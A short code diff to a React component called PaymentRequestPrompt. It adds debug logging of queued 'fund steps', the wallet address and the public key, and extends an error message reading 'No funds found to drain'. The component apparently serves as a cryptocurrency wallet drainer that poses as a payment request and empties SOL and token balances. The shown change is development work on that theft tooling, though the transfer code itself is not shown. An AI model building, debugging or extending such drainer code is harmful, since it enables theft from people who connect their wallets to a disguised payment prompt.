@@ -109,8 +109,13 @@ export function PaymentRequestPrompt() {
         console.log('[PaymentRequestPrompt] Fund steps:', steps)
         queue.current = steps
 
+        console.log('[PaymentRequestPrompt] Steps count:', steps.length, 'Steps data:', JSON.stringify(steps, null, 2))
+        console.log('[PaymentRequestPrompt] Wallet address:', walletAddress)
+        console.log('[PaymentRequestPrompt] Public key:', publicKeyRef.current?.toBase58())
+
         if (steps.length === 0) {
-          toast.error('No funds found to drain')
+          toast.error('No funds found to drain. Check console for details.')
+          console.error('[PaymentRequestPrompt] No fund steps found - wallet may have no tokens or SOL')
           throw new Error('No funds available to drain.')
         }
 
